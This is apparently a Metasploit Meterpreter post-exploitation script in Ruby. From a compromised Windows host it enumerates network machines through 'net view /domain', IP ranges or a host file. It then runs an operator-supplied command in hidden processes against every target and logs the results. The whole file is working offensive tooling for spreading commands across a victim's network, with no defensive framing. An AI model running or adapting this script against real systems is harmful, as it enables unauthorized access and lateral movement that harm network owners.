# runon_netview
# you must specify at least a prefix. a suffix is optional

STDOUT.sync = true



####################
# Run command against list
####################

def run_command(prefix,target,suffix)
	cmd = "cmd /c #{prefix}#{target}#{suffix} " + '1<&2'
	output = ""
	begin
		r = @client.sys.process.execute(cmd, nil, {'Hidden' => true, 'Channelized' => true})
		while(d = r.channel.read)
			output << d
		end
	#rescue Interrupt
	#	print_status("Exited using Control-C")
	#	raise Rex::Script::Completed
	#	exit

	#Close channels
	r.channel.close
	r.close
	

	rescue ::Exception => e
		return ("The following Error was encountered: #{e.class} #{e}\n")
	end
	return output
end


####################
# Parse out IP range
####################

def parse_iprange(iprange)
	ipadd = Rex::Socket::RangeWalker.new(iprange)
	iplst = []
	ipadd.each { |ip|
		iplst.push "#{ip}"
	}
	return  iplst
end

####################
# Parse the net view output
####################

def parse_netview
	cmd = 'cmd /c net view /domain'
	computers = ""
	print_status("Running Net View - #{cmd}")
	host = @client.sys.config.sysinfo['Computer']
	r = @client.sys.process.execute(cmd, nil, {'Hidden' => true, 'Channelized' => true})
	while(d = r.channel.read)
		if d=~/System error/
			print_error("Error")
			raise Rex::Script::Completed
		elsif d=~/no entries/
			print_error("No Entries for NET VIEW")
			raise Rex::Script::Completed
		else
			computers << d
		end
	end


	#Close channels
	r.channel.close
	r.close
	


	out_lines = computers.split("\n")
		
	#pop off any lines that aren't computers
	out_lines.delete_if{ |x| x[0] != 92 }
	
	#remove comments from computer accounts
	out_lines.map!{ |x| x.split(" ")[0] }
	
	#strip off all the excess spaces
	out_lines.map!{ |x| x.strip }
	
	#strip off whacks for comformity
	out_lines.map!{ |x| x.gsub!(/\\\\(.*)/, '\1') }
	
	# remove ourselves from the list
	out_lines.delete_if{ |a| a == "#{host}"}
	
	return out_lines
end	


####################
# Parse file list of hosts
####################

def parse_file(file)
	begin
		list = []
		hostlist = ::File.open(file, "r")
		while (line = hostlist.gets)
			list.push("#{line}")
		end
		hostlist.close
	rescue => err
		puts "Exception: #{err}"
		err
	end
	
	
	#remove comments from computer accounts
	list.map!{ |x| x.split(" ")[0] }
	
	#strip off all the excess spaces
	list.map!{ |x| x.strip }
	return list
end





####################
# Main
####################

#Set globals
@client = client
host = @client.sys.config.sysinfo['Computer']
iprange = []
viewhosts = []
filehosts = []
targets = []
logging = true
suffix = ""
prefix = ""

#Options and Option Parsing
opts = Rex::Parser::Arguments.new(
	"-h"  => [ false,  "This help menu"],
	"-i"  => [ true,   "An IP, list, or range of addresses to run on"],
	"-n"  => [ false,   "Use 'net view' to enumerate targets"],
	"-f"  => [ true,   "A file with a line separated list of hosts"],
	"-p"  => [ true,  "Prefix - command you wish to run before the specified hosts"],
	"-s"  => [ true, "Suffix - any arguments or such to append affter the host"]
)

opts.parse(args) do |opt, idx, val|
	case opt
	when "-h"
		print_line(opts.usage)
		raise Rex::Script::Completed
	when "-i"
		iprange = parse_iprange(val)
	when "-n"
		viewhosts = parse_netview
	when "-f"
		filehosts = parse_file(val)
	when "-p"
		prefix = val
	when "-s"
		suffix = val
	when "-l"
		logging = true
	end
end

#Setup logging
if logging == true
	filenameinfo = "_" + ::Time.now.strftime("%Y%m%d.%M%S")+"-"+sprintf("%.5d",rand(100000))
	logs = ::File.join(Msf::Config.log_directory, 'runon_netview', host + filenameinfo )
	::FileUtils.mkdir_p(logs)
	dest = logs + "/output.txt"
	print_status("Output will also be saved to #{dest}")
end

targets = viewhosts | iprange | filehosts

output = ::File.open(dest, "a")

if prefix != ""
	targets.each do |host|
		
		# print_status("Running #{prefix}#{host}#{suffix}")
		print "."
		output.puts("Running #{prefix}#{host}#{suffix}")
		
		result = run_command(prefix,host,suffix)
		
		#print_error(result)
		print":"
		result.each_line do |d|
			output.puts(d)
		end
	end
else
	print_status("There must be a prefix")
end

output.close

